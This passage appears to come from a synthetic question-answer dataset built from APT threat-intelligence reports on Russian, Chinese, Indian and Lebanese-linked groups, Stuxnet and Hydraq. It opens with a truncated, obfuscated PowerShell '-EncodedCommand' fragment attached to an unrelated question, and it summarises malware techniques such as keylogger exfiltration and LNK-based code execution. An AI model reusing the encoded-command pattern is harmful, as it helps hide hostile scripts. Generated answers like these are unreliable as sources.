-EncodedCommand\nZgB1AG4AYwB0AGkAbwBuACAAcABlAHIAZgBDAHIAKAAkAGMAcgBUAHIALAAgACQAZABhAHQAYQApAA0ACgB7AA0ACgAJACQAcgBlAHQAIAA9ACAAJABuAHUAbABsAA0ACgA\n\nWhat are the key differences in the tradecraft and operational security measures employed by COZY BEAR and FANCY BEAR? How do these differences impact their ability to evade detection and maintain persistence in a compromised network?",
    "output": "COZY BEAR's tradecraft involves a broadly targeted spearphishing campaign with web links to a malicious dropper, which delivers sophisticated Remote Access Tools (RATs) like AdobeARM, ATI-Agent, and MiniDionis. They employ extensive checks to avoid analysis in virtual machines, debuggers, or sandboxes, and their implants are highly configurable via encrypted configuration files. FANCY BEAR, on the other hand, uses a wide range of implants developed over many years, including Sofacy, X-Agent, and others, and is known for registering domains that mimic legitimate organizations to set up phishing sites. Both groups exhibit excellent operational security, but COZY BEAR's focus on avoiding detection through environmental checks and FANCY BEAR's diverse toolset and domain registration tactics highlight their respective strengths in evading detection and maintaining persistence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Introduction\nProofpoint researchers recently uncovered evidence of an advanced persistent threat (APT) against Indian diplomatic and military resources. Our investigation began with malicious emails sent to Indian embassies in Saudi Arabia and Kazakstan but turned up connections to watering hole sites focused on Indian military personnel and designed to drop a remote access Trojan (RAT) with a variety of data exfiltration functions. Our analysis shows that many of the campaigns and attacks appear related by common IOCs, vectors, payloads, and language, but the exact nature and attribution associated with this APT remain under investigation.\nAt this time, the background and analysis in this paper provide useful forensics and detail our current thinking on the malware that we have dubbed \"MSIL/Crimson\".\n\nQuestion: How did Proofpoint researchers discover the advanced persistent threat (APT) targeting Indian diplomatic and military resources, and what were the key indicators that linked various campaigns and attacks to this APT?\n\nAnswer:",
    "output": "Proofpoint researchers discovered the APT targeting Indian diplomatic and military resources through malicious emails sent to Indian embassies in Saudi Arabia and Kazakhstan. The investigation revealed connections to watering hole sites aimed at Indian military personnel, which were designed to deliver a remote access Trojan (RAT) capable of data exfiltration. Key indicators linking various campaigns and attacks included common Indicators of Compromise (IOCs), attack vectors, payloads, and language. Although the exact nature and attribution of this APT remain under investigation, these commonalities suggest a coordinated effort.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: EXECUTIVE SUMMARY\n\u2022 Our research attributes a decade of activity to a threat actor we call ModifiedElephant.\n\u2022 ModifiedElephant is responsible for targeted attacks on human rights activists, human rights defenders, academics, and lawyers across India with the objective of planting incriminating digital evidence.\n\u2022 ModifiedElephant has been operating since at least 2012, and has repeatedly targeted specific individuals.\n\u2022 ModifiedElephant operates through the use of commercially available remote access trojans (RATs) and has potential ties to the commercial surveillance industry.\n\u2022 The threat actor uses spearphishing with malicious documents to deliver malware, such as NetWire, DarkComet, and simple keyloggers with infrastructure overlaps that allow us to connect long periods of previously unattributed malicious activity.\nSentinelLabs Team\nMedium Headline: TARGETS & OBJECTIVES\nThe objective of ModifiedElephant is long-term surveillance that at times concludes with the delivery of 'evidence' \u2013files that incriminate the target in specific crimes\u2013 prior to conveniently coordinated arrests.\nAfter careful review of the attackers' campaigns over the last decade, we have identified hundreds of groups and individuals targeted by ModifiedElephant phishing campaigns. Activists, human rights defenders, journalists, academics, and law professionals in India are those most highly targeted. Notable targets include individuals associated with the Bhima Koregaon case.\nMedium Headline: INFECTION ATTEMPTS\nThroughout the last decade, ModifiedElephant operators sought to infect their targets via spearphishing emails with malicious file attachments, with their techniques evolving over time.\nTheir primary delivery mechanism is malicious Microsoft Office document files weaponized to deliver the malware of choice at the time. The specific payloads changed over the years and across different targets. However, some notable trends remain.\n\u2022 In mid-2013, the actor used phishing emails containing executable file attachments with fake double extensions (filename.pdf.exe).\n\u2022 After 2015, the actor moved on to less obvious files containing publicly available exploits, such as .doc, .pps, .docx, .rar, and password protected .rar files. These attempts involved legitimate lure documents in .pdf, .docx, and .mht formats to captivate the target's attention while also executing malware.\n\u2022 In 2019 phishing campaigns, ModifiedElephant operators also took the approach of providing links to files hosted externally for manual download and execution by the target.\n\u2022 in reference to a subset of this activity, the attacker also made use of large .rar archives (up to 300MB), potentially in an attempt to bypass detection.\nObserved lure documents repeatedly made use of , , ,  exploits to drop and execute their malware of choice.\nThe spearphishing emails and lure attachments are titled and generally themed around topics relevant to the target, such as activism news and groups, global and local events on climate change, politics, and public service. A public deconstruction of two seperate 2014 phishing emails was .\nFig 1: Spearphishing email containing malicious attachment attributed to ModifiedElephant\nModifiedElephant continually made use of free email service providers, like Gmail and Yahoo, to conduct their campaigns. The phishing emails take many approaches to gain the appearance of legitimacy. This includes fake body content with a forwarding history containing long lists of recipients, original email recipient lists with many seemingly fake accounts, or simply resending their malware multiple times using new emails or lure documents. Notably, in specific attacks, the actor would be particularly persistent and attempt to compromise the same individuals multiple times in a single day.\nBy reviewing a timeline of attacker activity, we can observe clear trends as the attacker(s) rotate infrastructure over the years.\nFig 2: Timeline sample of ModifiedElephant and SideWinder C2 Infrastructure.\nFor example, from early-2013 to mid-2016, a reasonably clear timeline can be built with little overlap, indicating a potential evolution or expansion of activities. Dates are based on first and last spearphishing emails observed delivering samples that communicate with a given domain. Notably, a separate Indian-nexus threat actor, SideWinder, is placed alongside ModifiedElephant in this graph as they were observed targeting the same individuals.\nMedium Headline: WEAPONS OF CHOICE\nThe malware most used by ModifiedElephant is unsophisticated and downright mundane, and yet it has proven sufficient for their objectives\u2013 obtaining remote access and unrestricted control of victim machines. The primary malware families deployed were NetWire and DarkComet remote access trojans (RATs). Both of these RATs are publicly available, and have a long history of abuse by threat actors across the spectrum of skill and capability.\nOne particular activity revolves around the file Ltr_1804_to_cc.pdf, which contains details of an assassination plot against Prime Minister Modi. A forensic report by Arsenal Consulting showed that this file,  pieces of evidence obtained by the police, was one of many files  that we associate with ModifiedElephant.  how ModifiedElephant was performing nearly identical evidence creation and organization across multiple unrelated victim systems within roughly fifteen minutes of each other.\nMedium Headline: INCUBATOR KEYLOGGER\nKnown victims have also been targeted with keylogger payloads stretching as far back as 2012 (). These keyloggers, packed at delivery, are written in Visual Basic and are not the least bit technically impressive. Moreover, they're built in such a brittle fashion that they no longer function.\nThe overall structure of the keylogger is fairly similar to code openly shared on  in 2012. The ModifiedElephant variant creates a hidden window titled 'cssrs incubator' along with SetWindowsHookEx to monitor for keystrokes. It registers the mutex\n\"4oR_$$$tonelsu-mviiLempel-Ziv\" and uses the  to query for the victim system's MAC address and operating system. The malware eventually exfiltrates the logs under the header \"Logs from <COMPUTERNAME>\" via email.\nFig 3: Log upload format string\nIn some ways, the Incubator keylogger is far more brittle than the code referenced above as it relies on specific web content to function (that code is no longer available on the internet at the time of writing). For example, the keylogger will use a GET request to an outdated 'whatismyip. com' endpoint in order to get the victim system's IP.\nFig 4: Outdated WhatIsMyIp endpoint used to check the victim's IP\nSimilarly, in order to exfiltrate the logs, the keylogger pulls Microsoft schema templates to set up an SMTP server and push out the content using a hardcoded (but obfuscated) email address. None of the schema sites requested by the keylogger are available at the time of writing, rendering the keylogger (in its 2012 form) unable to function.\nFig 5: Incubator keylogger using Microsoft schema templates to create an SMTP server\nThe keylogger makes use of hardcoded SMTP credentials and email addresses to deliver the logged keystrokes to attacker controlled accounts, including:\nThe keylogger samples also contain VBP and PDB paths, providing some potential context to their originating development environments.\nIn some cases, the attacker conducted multiple unique phishing attempts with the same payloads across one or more targets. However, ModifiedElephant generally conducts each infection attempt with new malware samples.\nMedium Headline: ANDROID TROJAN\nModifiedElephant also sent multiple phishing emails containing both NetWire and Android malware payloads at the same time. The Android malware is an unidentified commodity trojan delivered as an APK file (). While the Android trojan bears marks of being designed for broader cybercrime, its delivery at the same time as ModifiedElephant Netwire samples indicates that the same attacker was attempting to get full coverage of the target on both endpoint and mobile.\nFig 6: ModifiedElephant Phishing email with malicious attachments for Netwire and Android GM Bot variants.\nFig 7: ModifiedElephant Phishing email with malicious attachments for Netwire and Android GM Bot variants.\nThe trojan enables the attackers to intercept and manage SMS and call data, wipe or unlock the device, perform network requests, and remote administration. In a very basic form, the trojan provides the attackers with an ideal low-cost mobile surveillance toolkit.\n\nQuestion: What are the primary malware families deployed by ModifiedElephant, and how do they utilize these tools to achieve their objectives?\n\nAnswer:",
    "output": "The primary malware families deployed by ModifiedElephant are NetWire and DarkComet remote access trojans (RATs). These RATs are publicly available and have a long history of abuse by various threat actors. ModifiedElephant uses these tools to obtain remote access and unrestricted control of victim machines. Despite their simplicity, these tools have proven sufficient for the actor's objectives, which include long-term surveillance and the planting of incriminating digital evidence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: 3.3.2 In the Registry Key\nThe backdoor also checks the registry key HKLM\\Software\\Sun\\1.1.2\\AppleTlk. The value contained in this key is encoded information about the remote connection details.\nIf the registry key exist, it will decode the value using the following steps:\n\u2022 Perform a bitwise XOR with 0x99 as the key on each byte.\n\u2022 Perform the same custom decoding logic it used in the configuration found in file's resource section.\nThe updated configuration is always stored in the registry. The backdoor will then retrieve the specified hostname and alternate DNS to establish a remote connection. It checks the hostname IP Address if it is a valid IPv4 Internet address. If it is not, it retrieves the hostname IP address using an available DNS. If the backdoor cannot resolve the hostname IP address, it will sleep for two minutes and attempt to resolve the IP address using an available DNS again (see Listing 06).\nIf the registry key HKLM\\Software\\Sun\\1.1.2\\ does not exist, the backdoor continues the connection using the configuration specified from the backdoor resource section. Take note that the priority configuration used is always from the registry key next is the configuration from the resource.\n[Listing 06 - Win32/Hydraq reconnects after 2 minutes]\nVery Small Headline: 3.4.1 SYNchronize\nThe client sends a custom SYNchronize packet containing the following 20 bytes as initial handshake.\nFF FF FF FF FF FF 00 00 FE FF FF FF FF FF FF FF FF FF 88 FF\nThe set of bytes above are encrypted using a bitwise NOT operation. Thus, the raw set of bytes is the following:\nAs shown in Listing 07, the Win32/Hydraq backdoor code includes a routine that constructs the 20 byte SYNchronization packet that is sent to the client.\nThe initial handshake was captured during a test simulation performed in a controlled environment as shown in Appendix B. The backdoor uses port 443 to connect to the server. Port 443 is the known default port for the HTTPS protocol.\nHowever, in this case, the Win32/Hydraq backdoor did not take advantage of the available SSL/TLS encryption to secure its communication to the client. The information contained in the packet is evidently showing the set of bytes constructed by the malware.\n\nBased on the above text, answer a question. How does the Win32/Hydraq backdoor handle the registry key HKLM\\\\Software\\\\Sun\\\\1.1.2\\\\AppleTlk to establish a remote connection? Explain the steps involved in decoding the value contained in this key and how the backdoor proceeds if the key does not exist.",
    "output": "The Win32/Hydraq backdoor checks the registry key HKLM\\\\Software\\\\Sun\\\\1.1.2\\\\AppleTlk for encoded information about remote connection details. If the registry key exists, it decodes the value using a specific process: first, it performs a bitwise XOR with 0x99 as the key on each byte, followed by applying the same custom decoding logic used in the configuration found in the file's resource section. The updated configuration is always stored in the registry. The backdoor then retrieves the specified hostname and alternate DNS to establish a remote connection. It verifies if the hostname IP address is a valid IPv4 Internet address. If not, it resolves the hostname IP address using an available DNS. If the backdoor cannot resolve the hostname IP address, it sleeps for two minutes and attempts to resolve the IP address again using an available DNS. If the registry key HKLM\\\\Software\\\\Sun\\\\1.1.2\\\\ does not exist, the backdoor continues the connection using the configuration specified from the backdoor resource section. The priority configuration used is always from the registry key, followed by the configuration from the resource section.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 8. The weakest link \u2013 the computer user\nAs you read this article you could be an accomplice to a cyber criminal without even knowing that your computer is conducting a worldwide distributed denial of service attack. The actions or lack of action of computer users have contributed to the ability of hackers in Russia and elsewhere to conduct their attacks in relative anonymity. The internet has vulnerabilities and the individual computer user contributes to the vulnerabilities of private and government IT systems.\nIn 1997 the National Security Agency (NSA) conducted an exercise to find out how vulnerable government IT systems were to external cyber attacks. They named the exercise \"Eligible Receiver.\" Thirty-five IT specialists were given the mission to hack into government systems. They could use any software programs that were available on the internet and they were only given a few limitations. The IT specialists couldn't use any classified hacking software that belonged to the NSA and they could not violate U.S. law. The IT specialists were also confined to U.S. government computer systems. (Verton, 2003:32-33)\nWhat they discovered was how easy it was to hack into government systems, into both classified and unclassified networks. With the free software that they downloaded from the internet, the NSA specialists were able to conduct distributed denial of service attacks, delete or modify sensitive information and shut down or reformat systems. Along with the software they used, personal contact methods were also used to gain access into the systems. The NSA computer specialists would use telephone calls or emails to gain passwords or entry into a system by posing as a supervisor or technician. The IT specialists were surprised at how easily government and military members delivered their passwords without question. Even though the exercise was conducted in 1997, and may seem dated, it gives us a great example of how a dedicated effort can disrupt any IT system. (Verton, 2003:32-33)\nAs noted earlier, external flash drives were banned from use with military computer systems. Authorized users unknowingly passed intrusive malware files from computer to computer infecting IT systems throughout the U.S. Central Command. The ban on flash drives complicated the sharing of information throughout the theatre. The malware file was even found on a classified network. This is one more example of how an individual can spread malicious software infecting multiple computer systems because of a lack of computer security protocols. (Melikishvili, 2008/2009)\nOne vulnerability that is associated with computer users is that some people who become hackers are former employees with a grievance against their former employer. Such people may be motivated by a personal grudge against the U.S. government because they were fired or lost their job due to a reorganization or downsizing. Their actions as hackers are usually malicious in nature as such people steal or corrupt data, deface websites, or shut down systems. (Conway, 2007:82)\nEven more dangerous than an angry former employee is a case of cyber espionage. This is where an individual who is motivated by money or ideology sells highly sensitive IT security information. One such case involves Herman Simm and his wife, Heete Simm, from Estonia (Melikishvili, 2008/2009). Mr. Simm was arrested in September 2008 for allegedly passing highly classified information on cyber security and missile defence to members of the Russian foreign Intelligence Service (SVR). Mr. Simm was the head of the State Secret Protection Office where he was responsible for protecting Estonia's classified information. Mrs. Simm was a lawyer who was previously employed at the Estonian national police headquarters. Mr. Simm had access to classified information concerning NATO and allies of Estonia including the operational information of the NATO Cooperative Cyber Defence Centre based in Tallinn. If the Estonian government had access to a secret so did Mr. Simm. The amount of classified information that was compromised is unknown, but may be quite large. Mr. Simms allegedly became a Russian spy in the mid-1990's and was paid millions of dollars from the Russian Government. Regardless of how secure a country's IT structure is, it is still vulnerable because some people will compromise sensitive cyber security information for personal gain. (Melikishvili, 2008/2009)\nAlong with the vulnerabilities already mentioned there are always problems with software products. Some software is easy for hackers to take advantage of because of security deficiencies. Computers may be infected before the user or software company has identified the problem. Then it will take time for the software company to produce a security patch. It will take even more time to get the patch to the computer program user and for the security patch to be installed. During this time the infected computer program may have already infected other computers in a system or throughout the internet. (Wilson, 2006:15-16)\nA major vulnerability for any IT system is the computer user. Whether the computer user is a military member, a government employee, or just a computer user sitting in front of his computer at home, their practices can cause serious damage to a computer system. Normal computer users receive little or no training in the best security practices. (Wilson, 2006:14)\nThe cost of poor security practices can be high. Along with the loss of data or the disruption of service there is also the physical cost associated with malware and viruses. For example, in 2007 the Federal Bureau of Investigation (FBI) uncovered a botnet campaign that caused losses of over 20 million dollars (Cornish, 2009:9). One of the botnet hackers that was caught by the FBI and sentenced to prison used botnets to steal peoples' identities and bank account information. After gaining access to personal information and passwords he made on-line purchases and transferred money from the bank accounts. Another cyber attacker used a phishing scheme where he collected information through infected emails (Wired Staff, 2009). This section highlighted how the computer user has made IT structures even more vulnerable and the Simm affair demonstrates how cyber espionage adds to that vulnerability. If countries like the U.S. and Estonia that have highly developed IT infrastructure can be attacked, it is not hard to imagine the vulnerabilities less developed former Soviet satellites have in their IT development phase.\n\nBased on the above text, answer a question. What role did human factors play in the spread of malware within the U.S. Central Command, and how did this incident highlight the importance of strict computer security protocols?",
    "output": "Human factors played a significant role in the spread of malware within the U.S. Central Command. Authorized users unknowingly passed intrusive malware files from computer to computer using external flash drives, which were later banned. This malware was even found on a classified network, complicating the sharing of information throughout the theater. The incident underscored the importance of strict computer security protocols, as individual actions can lead to widespread infection and disruption of critical IT systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the APT group leverage the java-se.com domain in their attacks, and what measures can cybersecurity experts take to protect against similar domain-based threats?",
    "output": "The APT group used the java-se.com domain to host malicious JavaScript and Java Applets designed to exploit visitors' systems. Cybersecurity experts can protect against similar threats by implementing domain reputation services, blocking known malicious domains, and using threat intelligence feeds to stay informed about emerging threats. They should also configure web browsers to block untrusted domains and educate users about the risks of visiting unknown or suspicious websites.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nOver the past several months an increasing number of strategic web compromises (\"wateringholes\") have been discovered on websites in Hong Kong. This rise in activity coincides with the Occupy Central protests. In this post we will talk about a single attack, whilst not trying to distract attention from the vast number of attacks and subsequent compromises that remain persistent in Hong Kong.\nWhilst going about our daily business we were alerted to a website that began serving a malicious payload alongside its usual web page. The initial investigation revealed that the attack and associated payloads are part of an ongoing attack campaign by an Advanced Persistent Threat group that is known to target various sectors of industry and Government in Hong Kong.\nIn this instance we have chosen to obfuscate details of the compromised website to protect the identity of the victim. This website belongs to a private educational institution who, since being notified about the compromise, has removed the malicious executable and remediated the compromised of their server, thus breaking a crucial link in the chain of this attack.\n\nAnswer this question based on the above context: Why did the Advanced Persistent Threat (APT) group choose to use watering hole attacks during the Occupy Central protests in Hong Kong? How does this strategy benefit the attackers, and what measures can cyber security experts take to mitigate such threats?",
    "output": "The APT group chose to use watering hole attacks during the Occupy Central protests in Hong Kong because it allowed them to strategically target individuals who were likely to visit specific websites related to the protests. This strategy benefits the attackers by enabling them to compromise a large number of users without needing to directly target each one individually. By infecting popular or relevant websites, the attackers can increase the likelihood of successfully delivering their malicious payloads to a broader audience. To mitigate such threats, cyber security experts can implement several measures. First, they should regularly monitor and audit high-profile or politically sensitive websites for signs of compromise. Additionally, they can educate users about the risks of visiting potentially compromised sites and encourage the use of up-to-date security software and browser extensions that can detect and block malicious content. Furthermore, organizations should employ robust incident response plans to quickly identify and remediate compromises, as was done by the private educational institution mentioned in the report.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Domestic Targeting\nIn addition to international organizations of strategic interest, it also appears that Axiom has used Hikit internally to gather information on domestic Chinese targets. Cyber operations within China's own borders may be reflective of the Communist Party's emphasis on maintaining internal state security to ensure domestic stability, as the past three decades of rapid economic change have brought about a significant wage gap, unemployment issues, environmental issues, and other societal issues, in addition to long-standing issues such as disparate ethnic groups and territorial disputes. The CPC has subsequently dedicated significant resources toward domestic security: although domestic security spending for 2014 was not revealed by official sources, in the three years prior it has consistently exceeded the military budget26 . Among the well-funded entities tasked with domestic security are the Ministry of Public Security and the Ministry of State Security. In particular, the latter organization is the primary non-military security agency of China and is tasked with not only domestic surveillance, but also foreign intelligence and counterintelligence.\nMuch of previous public reporting on Chinese threat groups has concentrated on the cyber capabilities and information warfare of the People's Liberation Army (PLA). In particular, the Third Department serves as the PLA's telecommunications reconnaissance bureau charged with SIGINT for foreign intelligence operations27. The Third Department is divided into twelve bureaus, each ostensibly having a dedicated mission. For instance, the 2nd Bureau, or Unit 61398, has been directly linked by security researchers to attacks primarily focused on English-language organizations of strategic importance to China28. While this group has been responsible for a significant number of cyber attacks, the group's profiled operational security and tactics do not appear to be as sophisticated as those attributed to Axiom. In fact, researchers were able to directly link individuals to this bureau due to activity on social media as well as identifiable indicators used to register campaign command and control (C2) infrastructure, including domains or emails. Other individuals linked to Unit 61398 cyber operations have also been profiled by the FBI in an indictment of five Chinese military intelligence officers29. In contrast, there have been no identified mistakes in operational security on the part of Axiom operators to date.\nOther attacks targeting satellite/aerospace industries have been linked to the Third Department's 12th Bureau, Unit 6148630. Again, at least one individual has been connected to this activity using open-source intelligence due to a presence on social media and clues found in campaign infrastructure information, suggesting a lax operational security when compared to\nwhat has been observed with Axiom. Furthermore, attack activity from Unit 61486 has been linked to Unit 61398 based on shared infrastructure. This might suggest some degree of cooperation or overlap between these teams and missions in the Third Department that we have not yet observed between previously identified Chinese threat groups and Axiom, beyond the usage of commonly available malware. However, we cannot discount the possibility that previously reported Chinese threat groups could be linked to Axiom, or that both could be part of a larger organization.\n26 http://www.trust.org/item/20140305043104-x0f0c/0\n27 http://project2049.net/documents/countering_chinese_cyber_operations_stokes_hsiao.pdf\n28 http://intelreport.mandiant.com/Mandiant_APT1_Report.pdf\n29 http://www.fbi.gov/pittsburgh/press-releases/2014/u.s.-charges-five-chinese-military-hackers-with-cyber-espionage-against-u.s.-corporations-and-a-labor-organization-for-commercial-advantage\n30 http://www.crowdstrike.com/blog/hat-tribution-pla-unit-61486/index.html\nWhile it appears that the identified missions of most if not all units of the Third Department remain focused on foreign intelligence and defensive network security, there are some indications that a few PLA bureaus do engage in unconfirmed domestic monitoring to some degree, including monitoring of domestic broadcasts. Nevertheless, based on observed TTPs of identified PLA threat groups compared to Axiom activity, we believe that Axiom operates based on a different mission and has resources that previously reported and identified PLA cyber operators do not have.\nWhen examining Axiom's possible domestic attack activity, we have identified several instances of Hikit present on machines located in China or Hong Kong, dating at least as far back as January 2012. This would indicate domestic monitoring in addition to foreign operations, and may suggest that the group to which Axiom belongs is an entity charged with domestic security.\nAdditional telemetry we have observed suggests that Axiom may also target Chinese citizens, possibly dissidents, in foreign countries (including the United States and Asia-Pacific countries), based on the presence of Hikit on machines configured to use simplified Chinese. In particular, at least one Hikit sample was observed targeting a Chinese-language machine located in the United States; the filename \"LiulanqiXunzhang.exe.tdl\" appears to reference a browser (\u6d4f\u89c8\u5668).\nCertain indicators from Hikit binaries detected on machines in China or Hong Kong also provide further insight how these domestic victims are targeted by Axiom. The filenames of the malware, for instance, show that they were likely curated for Chinese speakers, as seen with Chinese-language file names including at least one referring to QQ, the popular messaging application. Other more generically popular applications like Adobe Flash Player were also used as potential lures or means of hiding in plain site. Novetta has also observed that Chinese-related filenames of commodity malware that has been used by both Axiom as well as other threat groups (e.g., Poison Ivy, PlugX, etc.) may also reflect a lively underground trade; some of the filenames we have observed are listed below.\nTable: Filenames of some malware binaries present on machines located in China\nAlthough this information does not conclusively determine that Axiom conducts such operations, when compared with some binary file names it could indicate deliberate targeting.\nAdditionally, Axiom has used at least one Chinese companies' certificate to sign a Hikit binary: \u5b89\u5fae\u79d1\u5927\u8baf\u98de\u4fe1\u606f\u79d1\u6280\u80a1\u4efd\u6709\u9650\u516c\u53f8 (Anwei iFLYTek Information Technology Co. Ltd.), which specializes in voice recognition software and is owned in part by China Mobile, a State asset. While we do not know if domestic companies were compromised for Axiom's purposes or, alternatively, have cooperated with Axiom campaigns, it again suggests Axiom ability and potential desire to stage domestic operations. Other Chinese companies as well as popular Asian gaming companies have also been used to digitally sign malware samples.\n31 Likely posing as the game Call of Duty Online\n32 Likely the online game League of Legends\n33 Might refer to the website hackxd .com (\u5144\u5f1f\u7f51\u7edc\u6280\u672f\u8bba\u575b, Fraternal Network Technology Forum)\nIn addition to Hikit, we have observed other Axiom-related malware targeting domestic organizations, including a few universities and research institutions in both Hong Kong and mainland China. Though this cannot be linked conclusively to Axiom Hikit operators, education institutions, particularly those in Hong Kong, would likely be of extreme importance for any monitoring of domestic activity -- not only is China worried about liberal academics, but also students, who have historically been leaders in pro-democracy movements as recently as this past summer with the Occupy Central protests in Hong Kong.\n\nHow does the use of digital certificates from Chinese companies by Axiom indicate its capability and potential intentions for domestic operations?",
    "output": "A: Axiom has used at least one Chinese company's certificate to sign a Hikit binary, specifically from Anwei iFLYTek Information Technology Co. Ltd., which specializes in voice recognition software and is partially owned by China Mobile, a State asset. This suggests Axiom's capability to either compromise domestic companies for its purposes or cooperate with them in its campaigns. The use of such certificates indicates Axiom's ability and potential desire to stage domestic operations, leveraging legitimate entities to enhance the credibility and effectiveness of its attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 3 Distribution\nIn this section we present information about the ways in which Stuxnet self-propagates. We pay close attention to the vulnerabilities used by the worm to propagate itself and describe it in details in this section. The reader can find comprehensive information here on the LNK vulnerability and its implementation in Stuxnet as well as on the MS10-061 vulnerability in the Windows Spooler, both of which are used to deliver and execute the malware's binaries on a remote machine. We also describe vulnerabilities in win32k.sys driver and Windows Task Scheduler Service implementation used to elevate Stuxnet's privileges up to SYSTEM level.\nThere are four ways the rootkit can distribute itself: by means of flash drives, through network shares, through an RPC vulnerability and through the recently patched MS10-061 Print Spooler vulnerability. The figure below depicts the vulnerabilities used for propagation and installation.\nMedium Headline: 3.1 The LNK exploit\nMicrosoft Security Advisory (2286198) CVE-2010-2568 includes links to detailed information about this exploit. . ESET allocated a separate detection family LNK/Autostart for the detection of attacks using this vulnerability. This vulnerability\nwas known to be in the wild for over a month even after it was identified before Microsoft were able to release a patch for it in late August 2010, as described in the following bulletin:\nThe vulnerability is not based on a standard means of exploitation, where you would expect to need to prepare exploit with shellcode, which would make use of the vulnerability. In fact any .LNK file can exploit it, at exploitation CVE-2010-2568 is used feature .LNK files, when displayed in windows explorer and the icon for a .LNK file is loaded from a CPL file (Windows Control Panel file). Actually, the CPL file represents a conventional dynamic link library and this is the crux of the vulnerability. The role of the payload module will be indicated in the path to the CPL file.\nSo below we can see the general scheme of the Shell Link (. LNK) Binary File Format ().\nThe most interesting feature here is hidden in the File Location Info field, which specifies the path from which the CPL file should be loaded. A vulnerability was found in Windows Shell which could allow code execution if the icon of a specially crafted shortcut is merely displayed. Here is a malicious .LNK file from an infected USB flash drive:\nIn the File Location Info field there is a path to the file that contains the payload that should be executed. In this case, the path points to an external drive, and when this is viewed in Windows Explorer it causes the system to execute ~wtr4141.tmp. More information on the distribution using external USB and media devices can be read in the section devoted to precisely this functionality.\nIn all the analyzed malicious .LNK files we have seen, there is a feature that consists of two GUID sequences. These sequences indicate the following:\nThe .LNK file most likely points to and loads a CPL file. When the directory containing the crafted .LNK exploit is opened with Windows Explorer, the following chain of function calls will eventually lead to a function call LoadLibraryW(). When the function LoadLibraryW() is called, the malware DLL will be executed.\nIf we trace this chain of calls in the debugger, we see confirmation of all the facts described above. Thus we can execute any malicious module, as LoadLibraryW() receives as a parameter the path to the module, which it must perform and no additional inspections are not happening.\nThis vulnerability highlights the fact that like many other bugs, this error has found its way into the architecture of fundamental mechanisms, in this case for processing LNK files. Vulnerabilities which, as in this case, are symptomatic of fundamental design flaws are a nightmare for developers of any program, because they are always difficult and time-consuming to fix.\nQuestion: How does the LNK exploit used by Stuxnet work, and why is it considered a significant vulnerability?",
    "output": "Answer: The LNK exploit used by Stuxnet leverages a vulnerability in how Windows processes .LNK files. Specifically, the exploit takes advantage of the fact that the icon for a .LNK file can be loaded from a CPL file, which is essentially a dynamic link library. The File Location Info field in the .LNK file specifies the path to the CPL file, which contains the payload to be executed. When the directory containing the crafted .LNK file is opened in Windows Explorer, a series of function calls leads to the execution of LoadLibraryW(), which loads and runs the malicious DLL without additional checks. This vulnerability is significant because it allows code execution simply by displaying the icon of a specially crafted shortcut, highlighting a fundamental design flaw in the way Windows handles .LNK files.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Describe the structure and encryption mechanism used by the custom TCP protocol in the Winnti worker component.",
    "output": "The custom TCP protocol in the Winnti worker component uses a structured header followed by a compressed payload. The header includes fields such as a magic value, flags indicating compression, an XOR key, CRC64 checksum, compressed size, and original packet size. The payload is typically compressed using LZMA. Before transmission, the entire packet is encrypted by XOR'ing each DWORD with a key generated by GetTickCount. Successful decryption is verified by XOR'ing the magic and XOR key fields to produce the expected magic value (0xACED1984).",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why does the APT report on APT37 emphasize the importance of taking this group seriously, and what specific tools and tactics contribute to this assessment?",
    "output": "The APT report on APT37 emphasizes the importance of taking this group seriously due to several factors. Firstly, APT37 has access to sophisticated tools, including zero-day vulnerabilities and wiper malware. Secondly, the heightened tensions in Northeast Asia and North Korea's history of norm-breaking behavior contribute to the seriousness of the threat. Additionally, APT37's alignment with North Korean state interests, as evidenced by malware development artifacts and targeting patterns, further underscores the need for vigilance. Specific tools and tactics that contribute to this assessment include the use of zero-day vulnerabilities like CVE-2018-4878, the deployment of wiper malware, and the expansion of their targeting scope to include entities beyond South Korea.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: TABLE OF C ONTENTS\nEXECUTIVE SUMMARY ....................................................................................... 3\nOVERVIEW........................................................................................................... 3\nATTACK TIMELINE .............................................................................................. 4\nSTEALTH ............................................................................................................. 4\nCONTROL NETWORK.......................................................................................... 4\nINFECTION SPREAD........................................................................................... 5\nATTRIBUTION ..................................................................................................... 6\nEXPLOSIVE ANALYSIS ......................................................................................... 7\nEXPLOSIVE VERSIONS ........................................................................................ 8\nCONFIGURATION................................................................................................ 8\nOBFUSCATION.................................................................................................... 9\nCOMMUNICATION .............................................................................................. 10\nAPPENDIX A \u2013 MICRO ......................................................................................... 15\nAPPENDIX B \u2013 REMOVABLE MEDIA INFECTION ............................................... 15\nAPPENDIX C \u2013 INDICATORS OF COMPROMISE.................................................. 16\nAPPENDIX D \u2013 SCRIPTS AND SIGNATURES ...................................................... 19\nAPPENDIX E \u2013 OTHER INFORMATION................................................................ 20\nAPPENDIX F \u2013 WEB SHELLS .............................................................................. 21\nAPPENDIX G \u2013 SAMPLE HASHES ....................................................................... 21\nAPPENDIX H \u2013 CHECK POINT DETECTION NAMES........................................... 22\nBig Headline: EXECUTIVE SUMMARY\nBeginning in late 2012, a carefully orchestrated attack campaign we call Volatile Cedar has been targeting individuals, companies and institutions worldwide. This campaign, led by a persistent attacker group, has successfully penetrated a large number of targets using various attack techniques, and specifically, a custom-made malware implant codenamed Explosive.\nThis report provides an extended technical analysis of Volatile Cedar and the Explosive malware.\nMalware attribution is often tricky and deception-prone. With that in mind, investigation of the evidence leads us to suspect Volatile Cedar originates from Lebanon (hence its nickname). 